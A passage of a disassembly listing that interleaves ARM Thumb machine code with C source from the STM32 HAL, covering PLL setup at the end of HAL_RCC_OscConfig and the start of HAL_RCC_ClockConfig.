 8003f22:	687b      	ldr	r3, [r7, #4]
 8003f24:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8003f26:	06db      	lsls	r3, r3, #27
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003f28:	429a      	cmp	r2, r3
 8003f2a:	d113      	bne.n	8003f54 <HAL_RCC_OscConfig+0x6a8>
#else
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLP)    != ((RCC_OscInitStruct->PLL.PLLP == RCC_PLLP_DIV7) ? 0U : 1U)) ||
#endif
#endif
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003f2c:	697b      	ldr	r3, [r7, #20]
 8003f2e:	f403 02c0 	and.w	r2, r3, #6291456	; 0x600000
 8003f32:	687b      	ldr	r3, [r7, #4]
 8003f34:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8003f36:	085b      	lsrs	r3, r3, #1
 8003f38:	3b01      	subs	r3, #1
 8003f3a:	055b      	lsls	r3, r3, #21
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003f3c:	429a      	cmp	r2, r3
 8003f3e:	d109      	bne.n	8003f54 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLR)    != ((((RCC_OscInitStruct->PLL.PLLR) >> 1U) - 1U) << RCC_PLLCFGR_PLLR_Pos)))
 8003f40:	697b      	ldr	r3, [r7, #20]
 8003f42:	f003 62c0 	and.w	r2, r3, #100663296	; 0x6000000
 8003f46:	687b      	ldr	r3, [r7, #4]
 8003f48:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8003f4a:	085b      	lsrs	r3, r3, #1
 8003f4c:	3b01      	subs	r3, #1
 8003f4e:	065b      	lsls	r3, r3, #25
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003f50:	429a      	cmp	r2, r3
 8003f52:	d06b      	beq.n	800402c <HAL_RCC_OscConfig+0x780>
      {
        /* Check if the PLL is used as system clock or not */
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 8003f54:	69bb      	ldr	r3, [r7, #24]
 8003f56:	2b0c      	cmp	r3, #12
 8003f58:	d062      	beq.n	8004020 <HAL_RCC_OscConfig+0x774>
        {
#if defined(RCC_PLLSAI1_SUPPORT) || defined(RCC_PLLSAI2_SUPPORT)
          /* Check if main PLL can be updated */
          /* Not possible if the source is shared by other enabled PLLSAIx */
          if((READ_BIT(RCC->CR, RCC_CR_PLLSAI1ON) != 0U)
 8003f5a:	4b32      	ldr	r3, [pc, #200]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003f5c:	681b      	ldr	r3, [r3, #0]
 8003f5e:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 8003f62:	2b00      	cmp	r3, #0
 8003f64:	d001      	beq.n	8003f6a <HAL_RCC_OscConfig+0x6be>
#if defined(RCC_PLLSAI2_SUPPORT)
             || (READ_BIT(RCC->CR, RCC_CR_PLLSAI2ON) != 0U)
#endif
            )
          {
            return HAL_ERROR;
 8003f66:	2301      	movs	r3, #1
 8003f68:	e0ac      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
          }
          else
#endif /* RCC_PLLSAI1_SUPPORT || RCC_PLLSAI2_SUPPORT */
          {
            /* Disable the main PLL. */
            __HAL_RCC_PLL_DISABLE();
 8003f6a:	4b2e      	ldr	r3, [pc, #184]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003f6c:	681b      	ldr	r3, [r3, #0]
 8003f6e:	4a2d      	ldr	r2, [pc, #180]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003f70:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8003f74:	6013      	str	r3, [r2, #0]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8003f76:	f7fd f915 	bl	80011a4 <HAL_GetTick>
 8003f7a:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003f7c:	e008      	b.n	8003f90 <HAL_RCC_OscConfig+0x6e4>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8003f7e:	f7fd f911 	bl	80011a4 <HAL_GetTick>
 8003f82:	4602      	mov	r2, r0
 8003f84:	693b      	ldr	r3, [r7, #16]
 8003f86:	1ad3      	subs	r3, r2, r3
 8003f88:	2b02      	cmp	r3, #2
 8003f8a:	d901      	bls.n	8003f90 <HAL_RCC_OscConfig+0x6e4>
              {
                return HAL_TIMEOUT;
 8003f8c:	2303      	movs	r3, #3
 8003f8e:	e099      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003f90:	4b24      	ldr	r3, [pc, #144]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003f92:	681b      	ldr	r3, [r3, #0]
 8003f94:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8003f98:	2b00      	cmp	r3, #0
 8003f9a:	d1f0      	bne.n	8003f7e <HAL_RCC_OscConfig+0x6d2>
              }
            }

            /* Configure the main PLL clock source, multiplication and division factors. */
#if defined(RCC_PLLP_SUPPORT)
            __HAL_RCC_PLL_CONFIG(RCC_OscInitStruct->PLL.PLLSource,
 8003f9c:	4b21      	ldr	r3, [pc, #132]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003f9e:	68da      	ldr	r2, [r3, #12]
 8003fa0:	4b21      	ldr	r3, [pc, #132]	; (8004028 <HAL_RCC_OscConfig+0x77c>)
 8003fa2:	4013      	ands	r3, r2
 8003fa4:	687a      	ldr	r2, [r7, #4]
 8003fa6:	6ad1      	ldr	r1, [r2, #44]	; 0x2c
 8003fa8:	687a      	ldr	r2, [r7, #4]
 8003faa:	6b12      	ldr	r2, [r2, #48]	; 0x30
 8003fac:	3a01      	subs	r2, #1
 8003fae:	0112      	lsls	r2, r2, #4
 8003fb0:	4311      	orrs	r1, r2
 8003fb2:	687a      	ldr	r2, [r7, #4]
 8003fb4:	6b52      	ldr	r2, [r2, #52]	; 0x34
 8003fb6:	0212      	lsls	r2, r2, #8
 8003fb8:	4311      	orrs	r1, r2
 8003fba:	687a      	ldr	r2, [r7, #4]
 8003fbc:	6bd2      	ldr	r2, [r2, #60]	; 0x3c
 8003fbe:	0852      	lsrs	r2, r2, #1
 8003fc0:	3a01      	subs	r2, #1
 8003fc2:	0552      	lsls	r2, r2, #21
 8003fc4:	4311      	orrs	r1, r2
 8003fc6:	687a      	ldr	r2, [r7, #4]
 8003fc8:	6c12      	ldr	r2, [r2, #64]	; 0x40
 8003fca:	0852      	lsrs	r2, r2, #1
 8003fcc:	3a01      	subs	r2, #1
 8003fce:	0652      	lsls	r2, r2, #25
 8003fd0:	4311      	orrs	r1, r2
 8003fd2:	687a      	ldr	r2, [r7, #4]
 8003fd4:	6b92      	ldr	r2, [r2, #56]	; 0x38
 8003fd6:	06d2      	lsls	r2, r2, #27
 8003fd8:	430a      	orrs	r2, r1
 8003fda:	4912      	ldr	r1, [pc, #72]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003fdc:	4313      	orrs	r3, r2
 8003fde:	60cb      	str	r3, [r1, #12]
                                 RCC_OscInitStruct->PLL.PLLQ,
                                 RCC_OscInitStruct->PLL.PLLR);
#endif

            /* Enable the main PLL. */
            __HAL_RCC_PLL_ENABLE();
 8003fe0:	4b10      	ldr	r3, [pc, #64]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003fe2:	681b      	ldr	r3, [r3, #0]
 8003fe4:	4a0f      	ldr	r2, [pc, #60]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003fe6:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8003fea:	6013      	str	r3, [r2, #0]

            /* Enable PLL System Clock output. */
            __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8003fec:	4b0d      	ldr	r3, [pc, #52]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003fee:	68db      	ldr	r3, [r3, #12]
 8003ff0:	4a0c      	ldr	r2, [pc, #48]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003ff2:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8003ff6:	60d3      	str	r3, [r2, #12]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8003ff8:	f7fd f8d4 	bl	80011a4 <HAL_GetTick>
 8003ffc:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8003ffe:	e008      	b.n	8004012 <HAL_RCC_OscConfig+0x766>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004000:	f7fd f8d0 	bl	80011a4 <HAL_GetTick>
 8004004:	4602      	mov	r2, r0
 8004006:	693b      	ldr	r3, [r7, #16]
 8004008:	1ad3      	subs	r3, r2, r3
 800400a:	2b02      	cmp	r3, #2
 800400c:	d901      	bls.n	8004012 <HAL_RCC_OscConfig+0x766>
              {
                return HAL_TIMEOUT;
 800400e:	2303      	movs	r3, #3
 8004010:	e058      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004012:	4b04      	ldr	r3, [pc, #16]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8004014:	681b      	ldr	r3, [r3, #0]
 8004016:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 800401a:	2b00      	cmp	r3, #0
 800401c:	d0f0      	beq.n	8004000 <HAL_RCC_OscConfig+0x754>
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 800401e:	e050      	b.n	80040c2 <HAL_RCC_OscConfig+0x816>
          }
        }
        else
        {
          /* PLL is already used as System core clock */
          return HAL_ERROR;
 8004020:	2301      	movs	r3, #1
 8004022:	e04f      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
 8004024:	40021000 	.word	0x40021000
 8004028:	019d808c 	.word	0x019d808c
      }
      else
      {
        /* PLL configuration is unchanged */
        /* Re-enable PLL if it was disabled (ie. low power mode) */
        if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800402c:	4b27      	ldr	r3, [pc, #156]	; (80040cc <HAL_RCC_OscConfig+0x820>)
 800402e:	681b      	ldr	r3, [r3, #0]
 8004030:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004034:	2b00      	cmp	r3, #0
 8004036:	d144      	bne.n	80040c2 <HAL_RCC_OscConfig+0x816>
        {
          /* Enable the main PLL. */
          __HAL_RCC_PLL_ENABLE();
 8004038:	4b24      	ldr	r3, [pc, #144]	; (80040cc <HAL_RCC_OscConfig+0x820>)
 800403a:	681b      	ldr	r3, [r3, #0]
 800403c:	4a23      	ldr	r2, [pc, #140]	; (80040cc <HAL_RCC_OscConfig+0x820>)
 800403e:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8004042:	6013      	str	r3, [r2, #0]

          /* Enable PLL System Clock output. */
          __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8004044:	4b21      	ldr	r3, [pc, #132]	; (80040cc <HAL_RCC_OscConfig+0x820>)
 8004046:	68db      	ldr	r3, [r3, #12]
 8004048:	4a20      	ldr	r2, [pc, #128]	; (80040cc <HAL_RCC_OscConfig+0x820>)
 800404a:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 800404e:	60d3      	str	r3, [r2, #12]

          /* Get Start Tick*/
          tickstart = HAL_GetTick();
 8004050:	f7fd f8a8 	bl	80011a4 <HAL_GetTick>
 8004054:	6138      	str	r0, [r7, #16]

          /* Wait till PLL is ready */
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004056:	e008      	b.n	800406a <HAL_RCC_OscConfig+0x7be>
          {
            if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004058:	f7fd f8a4 	bl	80011a4 <HAL_GetTick>
 800405c:	4602      	mov	r2, r0
 800405e:	693b      	ldr	r3, [r7, #16]
 8004060:	1ad3      	subs	r3, r2, r3
 8004062:	2b02      	cmp	r3, #2
 8004064:	d901      	bls.n	800406a <HAL_RCC_OscConfig+0x7be>
            {
              return HAL_TIMEOUT;
 8004066:	2303      	movs	r3, #3
 8004068:	e02c      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800406a:	4b18      	ldr	r3, [pc, #96]	; (80040cc <HAL_RCC_OscConfig+0x820>)
 800406c:	681b      	ldr	r3, [r3, #0]
 800406e:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004072:	2b00      	cmp	r3, #0
 8004074:	d0f0      	beq.n	8004058 <HAL_RCC_OscConfig+0x7ac>
 8004076:	e024      	b.n	80040c2 <HAL_RCC_OscConfig+0x816>
      }
    }
    else
    {
      /* Check that PLL is not used as system clock or not */
      if(sysclk_source != RCC_CFGR_SWS_PLL)
 8004078:	69bb      	ldr	r3, [r7, #24]
 800407a:	2b0c      	cmp	r3, #12
 800407c:	d01f      	beq.n	80040be <HAL_RCC_OscConfig+0x812>
      {
        /* Disable the main PLL. */
        __HAL_RCC_PLL_DISABLE();
 800407e:	4b13      	ldr	r3, [pc, #76]	; (80040cc <HAL_RCC_OscConfig+0x820>)
 8004080:	681b      	ldr	r3, [r3, #0]
 8004082:	4a12      	ldr	r2, [pc, #72]	; (80040cc <HAL_RCC_OscConfig+0x820>)
 8004084:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8004088:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 800408a:	f7fd f88b 	bl	80011a4 <HAL_GetTick>
 800408e:	6138      	str	r0, [r7, #16]

        /* Wait till PLL is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004090:	e008      	b.n	80040a4 <HAL_RCC_OscConfig+0x7f8>
        {
          if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004092:	f7fd f887 	bl	80011a4 <HAL_GetTick>
 8004096:	4602      	mov	r2, r0
 8004098:	693b      	ldr	r3, [r7, #16]
 800409a:	1ad3      	subs	r3, r2, r3
 800409c:	2b02      	cmp	r3, #2
 800409e:	d901      	bls.n	80040a4 <HAL_RCC_OscConfig+0x7f8>
          {
            return HAL_TIMEOUT;
 80040a0:	2303      	movs	r3, #3
 80040a2:	e00f      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 80040a4:	4b09      	ldr	r3, [pc, #36]	; (80040cc <HAL_RCC_OscConfig+0x820>)
 80040a6:	681b      	ldr	r3, [r3, #0]
 80040a8:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80040ac:	2b00      	cmp	r3, #0
 80040ae:	d1f0      	bne.n	8004092 <HAL_RCC_OscConfig+0x7e6>
        }
        /* Unselect main PLL clock source and disable main PLL outputs to save power */
#if defined(RCC_PLLSAI2_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI3CLK);
#elif defined(RCC_PLLSAI1_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI2CLK);
 80040b0:	4b06      	ldr	r3, [pc, #24]	; (80040cc <HAL_RCC_OscConfig+0x820>)
 80040b2:	68da      	ldr	r2, [r3, #12]
 80040b4:	4905      	ldr	r1, [pc, #20]	; (80040cc <HAL_RCC_OscConfig+0x820>)
 80040b6:	4b06      	ldr	r3, [pc, #24]	; (80040d0 <HAL_RCC_OscConfig+0x824>)
 80040b8:	4013      	ands	r3, r2
 80040ba:	60cb      	str	r3, [r1, #12]
 80040bc:	e001      	b.n	80040c2 <HAL_RCC_OscConfig+0x816>
#endif /* RCC_PLLSAI2_SUPPORT */
      }
      else
      {
        /* PLL is already used as System core clock */
        return HAL_ERROR;
 80040be:	2301      	movs	r3, #1
 80040c0:	e000      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
      }
    }
  }
  return HAL_OK;
 80040c2:	2300      	movs	r3, #0
}
 80040c4:	4618      	mov	r0, r3
 80040c6:	3720      	adds	r7, #32
 80040c8:	46bd      	mov	sp, r7
 80040ca:	bd80      	pop	{r7, pc}
 80040cc:	40021000 	.word	0x40021000
 80040d0:	feeefffc 	.word	0xfeeefffc

080040d4 <HAL_RCC_ClockConfig>:
  *         HPRE[3:0] bits to ensure that HCLK not exceed the maximum allowed frequency
  *         (for more details refer to section above "Initialization/de-initialization functions")
  * @retval None
  */
HAL_StatusTypeDef HAL_RCC_ClockConfig(RCC_ClkInitTypeDef  *RCC_ClkInitStruct, uint32_t FLatency)
{
 80040d4:	b580      	push	{r7, lr}
 80040d6:	b084      	sub	sp, #16
 80040d8:	af00      	add	r7, sp, #0
 80040da:	6078      	str	r0, [r7, #4]
 80040dc:	6039      	str	r1, [r7, #0]
  uint32_t hpre = RCC_SYSCLK_DIV1;
#endif
  HAL_StatusTypeDef status;

  /* Check Null pointer */
  if(RCC_ClkInitStruct == NULL)
 80040de:	687b      	ldr	r3, [r7, #4]
 80040e0:	2b00      	cmp	r3, #0
 80040e2:	d101      	bne.n	80040e8 <HAL_RCC_ClockConfig+0x14>
  {
    return HAL_ERROR;
 80040e4:	2301      	movs	r3, #1
 80040e6:	e0e7      	b.n	80042b8 <HAL_RCC_ClockConfig+0x1e4>
  /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
    must be correctly programmed according to the frequency of the CPU clock
    (HCLK) and the supply voltage of the device. */

  /* Increasing the number of wait states because of higher CPU frequency */
  if(FLatency > __HAL_FLASH_GET_LATENCY())
 80040e8:	4b75      	ldr	r3, [pc, #468]	; (80042c0 <HAL_RCC_ClockConfig+0x1ec>)
 80040ea:	681b      	ldr	r3, [r3, #0]
 80040ec:	f003 0307 	and.w	r3, r3, #7
 80040f0:	683a      	ldr	r2, [r7, #0]
 80040f2:	429a      	cmp	r2, r3
 80040f4:	d910      	bls.n	8004118 <HAL_RCC_ClockConfig+0x44>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 80040f6:	4b72      	ldr	r3, [pc, #456]	; (80042c0 <HAL_RCC_ClockConfig+0x1ec>)
 80040f8:	681b      	ldr	r3, [r3, #0]
 80040fa:	f023 0207 	bic.w	r2, r3, #7
 80040fe:	4970      	ldr	r1, [pc, #448]	; (80042c0 <HAL_RCC_ClockConfig+0x1ec>)
 8004100:	683b      	ldr	r3, [r7, #0]
 8004102:	4313      	orrs	r3, r2
 8004104:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 8004106:	4b6e      	ldr	r3, [pc, #440]	; (80042c0 <HAL_RCC_ClockConfig+0x1ec>)
 8004108:	681b      	ldr	r3, [r3, #0]
 800410a:	f003 0307 	and.w	r3, r3, #7
 800410e:	683a      	ldr	r2, [r7, #0]
 8004110:	429a      	cmp	r2, r3
 8004112:	d001      	beq.n	8004118 <HAL_RCC_ClockConfig+0x44>
    {
      return HAL_ERROR;
 8004114:	2301      	movs	r3, #1
 8004116:	e0cf      	b.n	80042b8 <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*----------------- HCLK Configuration prior to SYSCLK----------------------*/
  /* Apply higher HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is increased */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 8004118:	687b      	ldr	r3, [r7, #4]
 800411a:	681b      	ldr	r3, [r3, #0]
 800411c:	f003 0302 	and.w	r3, r3, #2
 8004120:	2b00      	cmp	r3, #0
 8004122:	d010      	beq.n	8004146 <HAL_RCC_ClockConfig+0x72>
  {
    assert_param(IS_RCC_HCLK(RCC_ClkInitStruct->AHBCLKDivider));

    if(RCC_ClkInitStruct->AHBCLKDivider > READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 8004124:	687b      	ldr	r3, [r7, #4]
 8004126:	689a      	ldr	r2, [r3, #8]
 8004128:	4b66      	ldr	r3, [pc, #408]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 800412a:	689b      	ldr	r3, [r3, #8]
 800412c:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004130:	429a      	cmp	r2, r3
 8004132:	d908      	bls.n	8004146 <HAL_RCC_ClockConfig+0x72>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 8004134:	4b63      	ldr	r3, [pc, #396]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 8004136:	689b      	ldr	r3, [r3, #8]
 8004138:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 800413c:	687b      	ldr	r3, [r7, #4]
 800413e:	689b      	ldr	r3, [r3, #8]
 8004140:	4960      	ldr	r1, [pc, #384]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 8004142:	4313      	orrs	r3, r2
 8004144:	608b      	str	r3, [r1, #8]
    }
  }

  /*------------------------- SYSCLK Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_SYSCLK) == RCC_CLOCKTYPE_SYSCLK)
 8004146:	687b      	ldr	r3, [r7, #4]
 8004148:	681b      	ldr	r3, [r3, #0]
 800414a:	f003 0301 	and.w	r3, r3, #1
 800414e:	2b00      	cmp	r3, #0
 8004150:	d04c      	beq.n	80041ec <HAL_RCC_ClockConfig+0x118>
  {
    assert_param(IS_RCC_SYSCLKSOURCE(RCC_ClkInitStruct->SYSCLKSource));

    /* PLL is selected as System Clock Source */
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_PLLCLK)
 8004152:	687b      	ldr	r3, [r7, #4]
 8004154:	685b      	ldr	r3, [r3, #4]
 8004156:	2b03      	cmp	r3, #3
 8004158:	d107      	bne.n	800416a <HAL_RCC_ClockConfig+0x96>
    {
      /* Check the PLL ready flag */
      if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800415a:	4b5a      	ldr	r3, [pc, #360]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 800415c:	681b      	ldr	r3, [r3, #0]
 800415e:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004162:	2b00      	cmp	r3, #0
 8004164:	d121      	bne.n	80041aa <HAL_RCC_ClockConfig+0xd6>
      {
        return HAL_ERROR;
 8004166:	2301      	movs	r3, #1
 8004168:	e0a6      	b.n	80042b8 <HAL_RCC_ClockConfig+0x1e4>
#endif
    }
    else
    {
      /* HSE is selected as System Clock Source */
      if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 800416a:	687b      	ldr	r3, [r7, #4]
 800416c:	685b      	ldr	r3, [r3, #4]
 800416e:	2b02      	cmp	r3, #2
 8004170:	d107      	bne.n	8004182 <HAL_RCC_ClockConfig+0xae>
      {
        /* Check the HSE ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8004172:	4b54      	ldr	r3, [pc, #336]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 8004174:	681b      	ldr	r3, [r3, #0]
 8004176:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 800417a:	2b00      	cmp	r3, #0
 800417c:	d115      	bne.n	80041aa <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 800417e:	2301      	movs	r3, #1
 8004180:	e09a      	b.n	80042b8 <HAL_RCC_ClockConfig+0x1e4>
        }
      }
      /* MSI is selected as System Clock Source */
      else if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_MSI)
 8004182:	687b      	ldr	r3, [r7, #4]
 8004184:	685b      	ldr	r3, [r3, #4]
 8004186:	2b00      	cmp	r3, #0
 8004188:	d107      	bne.n	800419a <HAL_RCC_ClockConfig+0xc6>
      {
        /* Check the MSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 800418a:	4b4e      	ldr	r3, [pc, #312]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 800418c:	681b      	ldr	r3, [r3, #0]
 800418e:	f003 0302 	and.w	r3, r3, #2
 8004192:	2b00      	cmp	r3, #0
 8004194:	d109      	bne.n	80041aa <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 8004196:	2301      	movs	r3, #1
 8004198:	e08e      	b.n	80042b8 <HAL_RCC_ClockConfig+0x1e4>
      }
      /* HSI is selected as System Clock Source */
      else
      {
        /* Check the HSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 800419a:	4b4a      	ldr	r3, [pc, #296]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 800419c:	681b      	ldr	r3, [r3, #0]
 800419e:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80041a2:	2b00      	cmp	r3, #0
 80041a4:	d101      	bne.n	80041aa <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 80041a6:	2301      	movs	r3, #1
 80041a8:	e086      	b.n	80042b8 <HAL_RCC_ClockConfig+0x1e4>
      }
#endif

    }

    MODIFY_REG(RCC->CFGR, RCC_CFGR_SW, RCC_ClkInitStruct->SYSCLKSource);
 80041aa:	4b46      	ldr	r3, [pc, #280]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 80041ac:	689b      	ldr	r3, [r3, #8]
 80041ae:	f023 0203 	bic.w	r2, r3, #3
 80041b2:	687b      	ldr	r3, [r7, #4]
 80041b4:	685b      	ldr	r3, [r3, #4]
 80041b6:	4943      	ldr	r1, [pc, #268]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 80041b8:	4313      	orrs	r3, r2
 80041ba:	608b      	str	r3, [r1, #8]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 80041bc:	f7fc fff2 	bl	80011a4 <HAL_GetTick>
 80041c0:	60f8      	str	r0, [r7, #12]

    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 80041c2:	e00a      	b.n	80041da <HAL_RCC_ClockConfig+0x106>
    {
      if((HAL_GetTick() - tickstart) > CLOCKSWITCH_TIMEOUT_VALUE)
 80041c4:	f7fc ffee 	bl	80011a4 <HAL_GetTick>
 80041c8:	4602      	mov	r2, r0
 80041ca:	68fb      	ldr	r3, [r7, #12]
 80041cc:	1ad3      	subs	r3, r2, r3
 80041ce:	f241 3288 	movw	r2, #5000	; 0x1388
 80041d2:	4293      	cmp	r3, r2
 80041d4:	d901      	bls.n	80041da <HAL_RCC_ClockConfig+0x106>
      {
        return HAL_TIMEOUT;
 80041d6:	2303      	movs	r3, #3
 80041d8:	e06e      	b.n	80042b8 <HAL_RCC_ClockConfig+0x1e4>
    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 80041da:	4b3a      	ldr	r3, [pc, #232]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 80041dc:	689b      	ldr	r3, [r3, #8]
 80041de:	f003 020c 	and.w	r2, r3, #12
 80041e2:	687b      	ldr	r3, [r7, #4]
 80041e4:	685b      	ldr	r3, [r3, #4]
 80041e6:	009b      	lsls	r3, r3, #2
 80041e8:	429a      	cmp	r2, r3
 80041ea:	d1eb      	bne.n	80041c4 <HAL_RCC_ClockConfig+0xf0>
  }
#endif

  /*----------------- HCLK Configuration after SYSCLK-------------------------*/
  /* Apply lower HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is set */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 80041ec:	687b      	ldr	r3, [r7, #4]
 80041ee:	681b      	ldr	r3, [r3, #0]
 80041f0:	f003 0302 	and.w	r3, r3, #2
 80041f4:	2b00      	cmp	r3, #0
 80041f6:	d010      	beq.n	800421a <HAL_RCC_ClockConfig+0x146>
  {
    if(RCC_ClkInitStruct->AHBCLKDivider < READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 80041f8:	687b      	ldr	r3, [r7, #4]
 80041fa:	689a      	ldr	r2, [r3, #8]
 80041fc:	4b31      	ldr	r3, [pc, #196]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 80041fe:	689b      	ldr	r3, [r3, #8]
 8004200:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004204:	429a      	cmp	r2, r3
 8004206:	d208      	bcs.n	800421a <HAL_RCC_ClockConfig+0x146>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
